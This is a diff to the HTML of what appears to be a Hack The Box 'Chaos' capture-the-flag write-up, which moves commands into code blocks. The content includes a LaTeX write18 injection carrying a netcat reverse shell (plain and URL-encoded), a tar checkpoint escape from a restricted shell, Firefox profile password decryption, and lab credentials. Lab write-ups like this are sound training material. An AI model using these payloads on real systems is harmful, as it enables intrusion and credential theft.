@@ -253,7 +253,10 @@ Thanks,
 Ayush
 
 </code></pre></div></div>
-<p><br> We got a link : <code class="highlighter-rouge">http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3</code>, Let’s check that.</p>
+<p><br> We got a link :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3
+</code></pre></div></div>
+<p><br> Let’s check that.</p>
 <hr>
 
 <h2 id="exploiting-latex-reverse-shell-as-www-data">Exploiting <code class="highlighter-rouge">LaTeX</code>, Reverse Shell as <code class="highlighter-rouge">www-data</code>
@@ -311,9 +314,13 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 <img src="/images/hackthebox/chaos/33.png" alt="">
 <br> <code class="highlighter-rouge">test3</code> as well. <code class="highlighter-rouge">LaTeX</code> can be injectable and can cause some vulnerabilities if there wasn’t a good filter. I tried some payloads from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection" target="_blank" rel="noopener noreferrer">Payloads All The Things</a> and most of them got filtered. But this injection payload worked : <code class="highlighter-rouge">\immediate\write18{command}</code>. So I got a reverse shell like this :
 <img src="/images/hackthebox/chaos/34.png" alt="">
-<br> Payload : <code class="highlighter-rouge">\immediate\write18{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f}</code> 
-<br> Url Encoded : <code class="highlighter-rouge">\immediate\write18{rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+10.10.xx.xx+1337+&gt;/tmp/f}</code>
-<img src="/images/hackthebox/chaos/35.png" alt="">
+<br> Payload :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\immediate\write18{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f}
+</code></pre></div></div>
+<p><br> Url Encoded :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\immediate\write18{rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+10.10.xx.xx+1337+&gt;/tmp/f}
+</code></pre></div></div>
+<p><img src="/images/hackthebox/chaos/35.png" alt="">
 <br> We got a reverse shell as <code class="highlighter-rouge">www-data</code>, There are two users on the box : <code class="highlighter-rouge">sahay</code> and <code class="highlighter-rouge">ayush</code>. We need to be one of them :
 <img src="/images/hackthebox/chaos/36.png" alt=""></p>
 <hr>
@@ -326,8 +333,10 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 <br> I created a file and called it <code class="highlighter-rouge">rick</code> : <code class="highlighter-rouge">touch rick</code>
 <br> Then I added that file to a tar archive and called it <code class="highlighter-rouge">rick.tar</code> : <code class="highlighter-rouge">tar -cvf rick.tar rick</code>
 <br> I went back to <code class="highlighter-rouge">ayush</code> and used <code class="highlighter-rouge">tar</code> to bypass the shell : <code class="highlighter-rouge">tar cf /dev/null rick.tar --checkpoint=1 --checkpoint-action=exec=/bin/bash</code>
-<br> After that I just had to fix my path and I had a functioning bash shell : <code class="highlighter-rouge">export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code>
-<img src="/images/hackthebox/chaos/38.png" alt="">
+<br> After that I just had to fix my path and I had a functioning bash shell :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+</code></pre></div></div>
+<p><img src="/images/hackthebox/chaos/38.png" alt="">
 <br> Now we can read the user flag :
 <img src="/images/hackthebox/chaos/39.png" alt="">
 <br> We owned user.</p>
@@ -343,9 +352,10 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 <br> Server Log :
 <img src="/images/hackthebox/chaos/42.png" alt="">
 <br> Downloaded files were saved in a directory called <code class="highlighter-rouge">chaos.htb:1919</code>.
-<br> After that I used <code class="highlighter-rouge">firefox_decrypt.py</code> and gave it the profile which was called <code class="highlighter-rouge">bzo7sjt1.default</code> : 
-<code class="highlighter-rouge">./firefox_decrypt.py ../firefox/chaos.htb\:1919/bzo7sjt1.default/</code>
-<img src="/images/hackthebox/chaos/43.png" alt="">
+<br> After that I used <code class="highlighter-rouge">firefox_decrypt.py</code> and gave it the profile which was called <code class="highlighter-rouge">bzo7sjt1.default</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./firefox_decrypt.py ../firefox/chaos.htb\:1919/bzo7sjt1.default/
+</code></pre></div></div>
+<p><img src="/images/hackthebox/chaos/43.png" alt="">
 <br> It asked for a password, I gave <code class="highlighter-rouge">ayush</code>’s password (<code class="highlighter-rouge">jiujitsu</code>) and it worked. We got credentials for the application that was running on port 10000 and the username was <code class="highlighter-rouge">root</code> : <code class="highlighter-rouge">root:Thiv8wrej~</code>.
 <br> I didn’t go to port 10000 again, I tried <code class="highlighter-rouge">su root</code> first with this password and it worked :
 <img src="/images/hackthebox/chaos/44.png" alt="">
